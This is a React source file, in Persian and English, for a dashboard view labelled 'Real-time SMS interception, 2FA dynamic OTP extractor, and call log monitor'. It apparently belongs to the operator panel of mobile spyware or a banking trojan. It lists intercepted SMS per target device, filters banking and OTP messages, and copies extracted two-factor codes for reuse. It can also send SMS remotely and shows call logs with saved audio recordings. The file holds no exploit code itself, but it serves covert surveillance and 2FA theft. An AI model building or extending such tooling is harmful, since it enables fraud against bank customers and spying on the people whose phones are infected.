import React, { useState } from 'react';
import { useDashboard } from '../../context/DashboardContext';
import { 
  MessageSquare, 
  Phone, 
  Search, 
  Send, 
  Copy, 
  Check, 
  Trash2, 
  KeyRound, 
  PhoneCall, 
  PhoneIncoming, 
  PhoneOutgoing, 
  PhoneMissed,
  Filter,
  CheckCircle2
} from 'lucide-react';
import { t } from '../../utils/translations';

export const SmsCallView: React.FC = () => {
  const { 
    lang, 
    smsList, 
    callsList, 
    selectedDevice, 
    deleteSms, 
    setIsSendSmsOpen,
    executeCommand,
    setToastMessage 
  } = useDashboard();

  const labels = t[lang];
  const [activeSubTab, setActiveSubTab] = useState<'sms' | 'calls'>('sms');
  const [filterType, setFilterType] = useState<'all' | 'otp' | 'banking'>('all');
  const [searchQuery, setSearchQuery] = useState('');
  const [copiedId, setCopiedId] = useState<string | null>(null);

  const handleCopyOtp = (code: string, id: string) => {
    navigator.clipboard.writeText(code);
    setCopiedId(id);
    setToastMessage(lang === 'fa' ? `کد OTP (${code}) در کلیپ‌بورد کپی شد` : `OTP code (${code}) copied`);
    setTimeout(() => setCopiedId(null), 2000);
  };

  const filteredSms = smsList.filter(s => {
    const matchesSearch = 
      s.body.toLowerCase().includes(searchQuery.toLowerCase()) ||
      s.sender.toLowerCase().includes(searchQuery.toLowerCase()) ||
      (s.otpCode && s.otpCode.includes(searchQuery));

    const matchesFilter = 
      filterType === 'all' || 
      (filterType === 'otp' && s.isOtp) || 
      (filterType === 'banking' && Boolean(s.bankName));

    return matchesSearch && matchesFilter;
  });

  return (
    <div className="space-y-6">
      {/* Top Header */}
      <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-3 border-b border-slate-800/60 pb-4">
        <div>
          <h1 className="text-xl font-bold tracking-tight text-white">
            {labels.navSmsCalls}
          </h1>
          <p className="text-xs text-slate-400 mt-1">
            {lang === 'fa' 
              ? 'شنود لحظه‌ای پیامک‌های دریافتی، استخراج خودکار کدهای ۲FA پویا و سوابق تماس' 
              : 'Real-time SMS interception, 2FA dynamic OTP extractor, and call log monitor'}
          </p>
        </div>

        <div className="flex items-center gap-2">
          {/* Sub Tab Switcher */}
          <div className="flex items-center bg-slate-900 border border-slate-800 rounded-lg p-1">
            <button
              onClick={() => setActiveSubTab('sms')}
              className={`px-3 py-1.5 rounded-md text-xs font-medium transition-colors cursor-pointer flex items-center gap-1.5 ${
                activeSubTab === 'sms' ? 'bg-cyan-600 text-slate-950 font-semibold' : 'text-slate-400 hover:text-white'
              }`}
            >
              <MessageSquare className="w-3.5 h-3.5" />
              <span>{lang === 'fa' ? 'پیامک‌ها و رمز پویا' : 'SMS & OTPs'}</span>
            </button>
            <button
              onClick={() => setActiveSubTab('calls')}
              className={`px-3 py-1.5 rounded-md text-xs font-medium transition-colors cursor-pointer flex items-center gap-1.5 ${
                activeSubTab === 'calls' ? 'bg-cyan-600 text-slate-950 font-semibold' : 'text-slate-400 hover:text-white'
              }`}
            >
              <Phone className="w-3.5 h-3.5" />
              <span>{lang === 'fa' ? 'تماس‌ها و مکالمات' : 'Call Logs'}</span>
            </button>
          </div>

          {/* Send SMS Action */}
          <button
            onClick={() => setIsSendSmsOpen(true)}
            className="flex items-center gap-1.5 px-3 py-1.5 bg-slate-900 hover:bg-slate-800 border border-slate-800 text-slate-200 text-xs rounded-lg transition-colors cursor-pointer"
          >
            <Send className="w-3.5 h-3.5 text-cyan-400" />
            <span>{labels.sendSmsBtn}</span>
          </button>
        </div>
      </div>

      {activeSubTab === 'sms' ? (
        /* SMS Section */
        <div className="space-y-4">
          {/* Search & Sub-Filter Bar */}
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 bg-slate-900/40 p-3 rounded-xl border border-slate-800/80">
            <div className="relative flex-1 max-w-md">
              <Search className="w-4 h-4 text-slate-500 absolute start-3 top-1/2 -translate-y-1/2" />
              <input
                type="text"
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                placeholder={lang === 'fa' ? 'جستجو در متن پیام، فرستنده یا کد OTP...' : 'Search SMS body, sender or OTP code...'}
                className="w-full bg-slate-950 border border-slate-800 rounded-lg ps-9 pe-3 py-2 text-xs text-slate-200 placeholder-slate-500 outline-none focus:border-cyan-500"
              />
            </div>

            <div className="flex items-center gap-2">
              <button
                onClick={() => setFilterType('all')}
                className={`px-3 py-1.5 text-xs rounded-lg font-medium transition-colors cursor-pointer ${
                  filterType === 'all' ? 'bg-slate-800 text-white' : 'text-slate-400 hover:text-slate-200'
                }`}
              >
                {lang === 'fa' ? 'همه پیام‌ها' : 'All SMS'}
              </button>
              <button
                onClick={() => setFilterType('otp')}
                className={`px-3 py-1.5 text-xs rounded-lg font-medium transition-colors cursor-pointer flex items-center gap-1.5 ${
                  filterType === 'otp' ? 'bg-amber-950/70 border border-amber-800/50 text-amber-300' : 'text-slate-400 hover:text-slate-200'
                }`}
              >
                <KeyRound className="w-3.5 h-3.5 text-amber-400" />
                <span>{lang === 'fa' ? 'فقط رمز پویا (OTP)' : 'OTP Only'}</span>
              </button>
              <button
                onClick={() => setFilterType('banking')}
                className={`px-3 py-1.5 text-xs rounded-lg font-medium transition-colors cursor-pointer ${
                  filterType === 'banking' ? 'bg-cyan-950/70 border border-cyan-800/50 text-cyan-300' : 'text-slate-400 hover:text-slate-200'
                }`}
              >
                {lang === 'fa' ? 'بانکی و مالی' : 'Banking'}
              </button>
            </div>
          </div>

          {/* SMS Messages List */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {filteredSms.length === 0 ? (
              <div className="col-span-2 p-12 text-center text-slate-500 bg-slate-900/40 rounded-xl border border-slate-800">
                {lang === 'fa' ? 'پیامکی با مشخصات جستجو پیدا نشد.' : 'No messages matching query.'}
              </div>
            ) : (
              filteredSms.map((sms) => (
                <div
                  key={sms.id}
                  className={`p-4 rounded-xl border transition-all ${
                    sms.isOtp
                      ? 'bg-amber-950/15 border-amber-500/40 shadow-sm'
                      : 'bg-slate-900/60 border-slate-800/80 hover:border-slate-700'
                  }`}
                >
                  {/* Top Bar of Card */}
                  <div className="flex items-center justify-between text-xs mb-2">
                    <div className="flex items-center gap-2">
                      <span className="font-semibold text-white">
                        {sms.sender}
                      </span>
                      {sms.type === 'sent' && (
                        <span className="text-[10px] text-cyan-400 font-mono">
                          {lang === 'fa' ? '(ارسال شده از ریموت)' : '(Sent via Remote)'}
                        </span>
                      )}
                    </div>
                    <div className="flex items-center gap-2 text-[11px] text-slate-400 font-mono">
                      <span>{sms.timestamp}</span>
                      <button
                        onClick={() => deleteSms(sms.id)}
                        className="text-slate-500 hover:text-rose-400 p-1 rounded transition-colors cursor-pointer"
                        title={lang === 'fa' ? 'حذف' : 'Delete'}
                      >
                        <Trash2 className="w-3.5 h-3.5" />
                      </button>
                    </div>
                  </div>

                  {/* Body Text */}
                  <p className="text-xs text-slate-200 leading-relaxed font-sans mb-3">
                    {sms.body}
                  </p>

                  {/* OTP Extractor Callout */}
                  {sms.isOtp && sms.otpCode && (
                    <div className="p-2.5 rounded-lg bg-slate-950/80 border border-amber-500/40 flex items-center justify-between">
                      <div className="flex items-center gap-2">
                        <KeyRound className="w-4 h-4 text-amber-400" />
                        <span className="text-xs text-slate-300">
                          {lang === 'fa' ? 'کد اعتبارسنجی استخراج‌شده:' : 'Extracted 2FA Code:'}
                        </span>
                        <span className="font-mono font-bold text-base text-amber-400 tracking-wider">
                          {sms.otpCode}
                        </span>
                      </div>
                      <button
                        onClick={() => handleCopyOtp(sms.otpCode!, sms.id)}
                        className="flex items-center gap-1 px-2.5 py-1 rounded bg-amber-500/20 hover:bg-amber-500/30 text-amber-300 text-xs font-mono transition-colors cursor-pointer"
                      >
                        {copiedId === sms.id ? (
                          <>
                            <Check className="w-3 h-3 text-emerald-400" />
                            <span>{lang === 'fa' ? 'کپی شد' : 'Copied'}</span>
                          </>
                        ) : (
                          <>
                            <Copy className="w-3 h-3" />
                            <span>{lang === 'fa' ? 'کپی کد' : 'Copy'}</span>
                          </>
                        )}
                      </button>
                    </div>
                  )}

                  {/* Metadata footer */}
                  <div className="mt-2 text-[10px] text-slate-500 font-mono flex items-center justify-between">
                    <span>Target: {sms.recipient}</span>
                    <span>Device: {sms.deviceId}</span>
                  </div>
                </div>
              ))
            )}
          </div>
        </div>
      ) : (
        /* Calls Section */
        <div className="rounded-xl bg-slate-900/60 border border-slate-800/80 overflow-hidden">
          <div className="overflow-x-auto">
            <table className="w-full text-xs text-start">
              <thead>
                <tr className="border-b border-slate-800 bg-slate-950/60 text-slate-400 text-[11px]">
                  <th className="py-3 px-4 font-medium text-start">{lang === 'fa' ? 'نوع تماس' : 'Call Type'}</th>
                  <th className="py-3 px-4 font-medium text-start">{lang === 'fa' ? 'مخاطب و شماره تلفن' : 'Contact & Number'}</th>
                  <th className="py-3 px-4 font-medium text-start">{lang === 'fa' ? 'مدت زمان مکالمه' : 'Duration'}</th>
                  <th className="py-3 px-4 font-medium text-start">{lang === 'fa' ? 'زمان تماس' : 'Timestamp'}</th>
                  <th className="py-3 px-4 font-medium text-end">{lang === 'fa' ? 'فایل صوتی ضبط شده' : 'Audio Recording'}</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-slate-800/50">
                {callsList.map((c) => {
                  const isIncoming = c.type === 'incoming';
                  const isOutgoing = c.type === 'outgoing';
                  const isMissed = c.type === 'missed';

                  return (
                    <tr key={c.id} className="hover:bg-slate-800/25 transition-colors">
                      <td className="py-3 px-4">
                        <div className="flex items-center gap-1.5 font-medium">
                          {isIncoming && (
                            <>
                              <PhoneIncoming className="w-3.5 h-3.5 text-cyan-400" />
                              <span className="text-cyan-300">{lang === 'fa' ? 'ورودی' : 'Incoming'}</span>
                            </>
                          )}
                          {isOutgoing && (
                            <>
                              <PhoneOutgoing className="w-3.5 h-3.5 text-emerald-400" />
                              <span className="text-emerald-300">{lang === 'fa' ? 'خروجی' : 'Outgoing'}</span>
                            </>
                          )}
                          {isMissed && (
                            <>
                              <PhoneMissed className="w-3.5 h-3.5 text-rose-400" />
                              <span className="text-rose-400">{lang === 'fa' ? 'از دست رفته' : 'Missed'}</span>
                            </>
                          )}
                        </div>
                      </td>

                      <td className="py-3 px-4">
                        <div className="font-semibold text-slate-200">{c.contactName}</div>
                        <div className="text-[10px] text-slate-400 font-mono" dir="ltr">{c.phoneNumber}</div>
                      </td>

                      <td className="py-3 px-4 font-mono tabular-nums text-slate-300">
                        {c.durationSeconds > 0 ? `${c.durationSeconds}s` : '—'}
                      </td>

                      <td className="py-3 px-4 font-mono text-slate-400 text-[11px]">
                        {c.timestamp}
                      </td>

                      <td className="py-3 px-4 text-end">
                        {c.recorded ? (
                          <span className="inline-flex items-center gap-1 text-[11px] text-emerald-400 font-mono">
                            <CheckCircle2 className="w-3.5 h-3.5" />
                            <span>REC_SAVED (AAC)</span>
                          </span>
                        ) : (
                          <span className="text-[11px] text-slate-500 font-mono">
                            NOT_RECORDED
                          </span>
                        )}
                      </td>
                    </tr>
                  );
                })}
              </tbody>
            </table>
          </div>
        </div>
      )}
    </div>
  );
};
